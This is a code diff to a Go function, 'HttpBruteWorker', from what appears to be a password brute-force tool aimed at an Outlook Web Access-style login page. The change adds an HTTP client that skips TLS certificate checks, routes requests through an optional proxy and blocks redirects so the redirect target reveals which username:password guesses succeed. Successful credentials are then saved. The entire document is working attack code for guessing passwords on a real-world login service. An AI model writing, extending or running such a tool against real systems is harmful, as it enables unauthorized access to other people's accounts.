@@ -1,6 +1,7 @@
 package lib
 
 import (
+	"crypto/tls"
 	"net/http"
 	"net/url"
 	"strings"
@@ -23,6 +24,26 @@ func HttpBruteWorker(info *TaskInfo) {
 			continue
 		}
 		Log.Debug("[*] 尝试: %v:%v", username, password)
+
+		var client = &http.Client{
+			Transport: &http.Transport{
+				TLSClientConfig: &tls.Config{
+					InsecureSkipVerify: true,
+					Renegotiation:      tls.RenegotiateOnceAsClient,
+				},
+				Proxy: func(_ *http.Request) (*url.URL, error) {
+					if info.proxy != "" {
+						return url.Parse(info.proxy)
+					} else {
+						return nil, nil
+					}
+				},
+			},
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				return http.ErrUseLastResponse
+			},
+		}
+
 		form := url.Values{
 			"destination":    {refUrl},
 			"flags":          {"4"},
@@ -39,7 +60,7 @@ func HttpBruteWorker(info *TaskInfo) {
 		req.Header.Set("Cookie", "PrivateComputer=true; PBack=0")
 		req.Header.Set("Connection", "close")
 
-		res, err := Client.Do(req)
+		res, err := client.Do(req)
 		if err != nil {
 			panic(err)
 		}
@@ -49,7 +70,7 @@ func HttpBruteWorker(info *TaskInfo) {
 			Log.Failed("[-] 失败: %v", username+":"+password)
 		} else if !strings.Contains(location, "reason") {
 			Log.Success("[+] 成功: %v", username+":"+password)
-			info.done.Set(username)
+			info.done.Set(username, password, info.o)
 		} else {
 			Log.Failed("[-] 失败: %v", username+":"+password)
 		}
